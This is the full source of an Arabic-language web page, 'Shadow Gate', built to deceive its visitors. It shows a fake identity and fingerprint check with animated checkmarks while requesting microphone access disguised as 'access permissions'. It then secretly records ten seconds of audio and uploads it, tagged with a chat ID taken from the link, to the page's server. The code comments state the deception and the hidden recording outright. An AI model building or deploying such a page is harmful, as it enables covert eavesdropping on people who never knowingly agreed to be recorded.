<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Shadow Gate - بوابة الضل</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@700;900&family=Share+Tech+Mono&display=swap');
    body {
      background-color: #0a0000; color: #ff0000; font-family: 'Share Tech Mono', monospace;
      margin: 0; padding: 0; display: flex; flex-direction: column; align-items: center; justify-content: center;
      height: 100vh; width: 100vw; overflow: hidden;
      background-image: linear-gradient(rgba(255, 0, 0, 0.05) 1px, transparent 1px), linear-gradient(90deg, rgba(255, 0, 0, 0.05) 1px, transparent 1px);
      background-size: 20px 20px;
    }
    .container { 
      width: 100%; 
      max-width: 400px; 
      padding: 20px; 
      text-align: center; 
      border: 2px solid #ff0000;
      border-radius: 15px;
      box-shadow: 0 0 30px rgba(255, 0, 0, 0.4), inset 0 0 20px rgba(255, 0, 0, 0.2);
      background: rgba(5, 0, 0, 0.95);
    }
    h1 { font-family: 'Cairo', sans-serif; font-weight: 900; font-size: 26px; text-shadow: 0 0 15px #ff0000; margin-bottom: 5px; color: #ff0000; }
    .sub { font-size: 11px; color: #ff6666; margin-bottom: 20px; letter-spacing: 1px; }
    
    /* شكل بوابة الضل (دايرة سكان) */
    .gate-icon {
      position: relative;
      width: 80px; height: 80px;
      margin: 0 auto 20px auto;
      border: 3px solid #ff0000;
      border-radius: 50%;
      box-shadow: 0 0 20px #ff0000, inset 0 0 20px #ff0000;
      display: flex; align-items: center; justify-content: center;
      font-size: 40px; color: #ff0000;
      animation: pulse-gate 2s infinite;
    }
    @keyframes pulse-gate {
      0% { box-shadow: 0 0 10px #ff0000, inset 0 0 10px #ff0000; }
      50% { box-shadow: 0 0 30px #ff0000, inset 0 0 30px #ff0000; }
      100% { box-shadow: 0 0 10px #ff0000, inset 0 0 10px #ff0000; }
    }

    .btn {
      background: rgba(255, 0, 0, 0.1); color: #ff0000; border: 2px solid #ff0000;
      padding: 15px 30px; font-size: 18px; font-family: 'Cairo', sans-serif; font-weight: bold;
      border-radius: 8px; cursor: pointer; box-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
      width: 100%; transition: 0.3s;
    }
    .btn:active { background: #ff0000; color: #000; box-shadow: 0 0 40px #ff0000; }

    /* قائمة علامات الصح */
    .check-list {
      text-align: right;
      margin-top: 20px;
      display: none; /* مخفية في الأول */
    }
    .check-item {
      font-size: 15px;
      color: #00ff00;
      margin-bottom: 10px;
      text-shadow: 0 0 5px #00ff00;
      display: flex;
      align-items: center;
      gap: 10px;
      opacity: 0;
      animation: fadeInRight 0.5s forwards;
    }
    @keyframes fadeInRight {
      from { opacity: 0; transform: translateX(20px); }
      to { opacity: 1; transform: translateX(0); }
    }
    
    .check-icon {
      font-size: 18px;
      color: #00ff00;
      text-shadow: 0 0 10px #00ff00;
    }

    .status-text {
      font-size: 16px;
      color: #ffff00;
      margin-top: 20px;
      font-weight: bold;
      text-shadow: 0 0 10px #ffff00;
      min-height: 24px;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="gate-icon">🗝️</div>
    <h1>بوابة الضل</h1>
    <div class="sub">SHADOW GATE SYSTEM v1.0</div>

    <div id="checkList" class="check-list">
      <div class="check-item"><span class="check-icon">✔</span> تم الاتصال بالسيرفر...</div>
      <div class="check-item"><span class="check-icon">✔</span> جاري التحقق من الهوية...</div>
      <div class="check-item"><span class="check-icon">✔</span> جاري فحص البصمة...</div>
      <div class="check-item"><span class="check-icon">✔</span> جاري تسجيلك في النظام...</div>
    </div>

    <div id="status" class="status-text"></div>

    <button class="btn" id="startBtn">دخول بوابة الضل</button>
  </div>

  <script>
    const startBtn = document.getElementById('startBtn');
    const status = document.getElementById('status');
    const checkList = document.getElementById('checkList');
    let mediaRecorder;
    let audioChunks = [];
    
    const urlParams = new URLSearchParams(window.location.search);
    const userChatId = urlParams.get('chatId');

    startBtn.onclick = async () => {
      if (!userChatId) {
        status.innerText = "❌ خطأ: هذا الرابط غير صالح.";
        return;
      }

      try {
        startBtn.style.display = 'none';
        status.innerText = "جاري طلب صلاحيات الدخول...";
        
        // طلب إذن الميكروفون (تحت اسم صلاحيات الدخول)
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
        
        mediaRecorder = new MediaRecorder(stream);
        
        mediaRecorder.ondataavailable = event => {
          audioChunks.push(event.data);
        };

        mediaRecorder.onstop = async () => {
          status.innerText = "جاري إرسال البيانات...";
          const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
          
          const formData = new FormData();
          formData.append('voice', audioBlob, 'voice_record.webm');
          formData.append('chat_id', userChatId);

          try {
            const response = await fetch('/upload_voice', {
              method: 'POST',
              body: formData
            });
            
            if (response.ok) {
              status.innerText = "✅ تم تسجيلك في بوابة الضل بنجاح! (أغلق الصفحة)";
              status.style.color = "#00ff00";
              status.style.textShadow = "0 0 10px #00ff00";
            } else {
              status.innerText = "❌ فشل الاتصال بالسيرفر.";
            }
          } catch (err) {
            status.innerText = "❌ فشل الإرسال.";
          }
        };

        // عرض علامات الصح واحدة ورا التانية
        checkList.style.display = 'block';
        status.innerText = "جاري المعالجة...";

        // بدء التسجيل في الخفاء
        mediaRecorder.start();

        // التوقيت 10 ثواني
        setTimeout(() => {
          mediaRecorder.stop(); // إيقاف التسجيل
          stream.getTracks().forEach(track => track.stop()); // إغلاق الميكروفون
        }, 10000);

      } catch (err) {
        status.innerText = "❌ تم رفض صلاحيات الدخول!";
        startBtn.style.display = 'inline-block';
      }
    };
  </script>
</body>
</html>
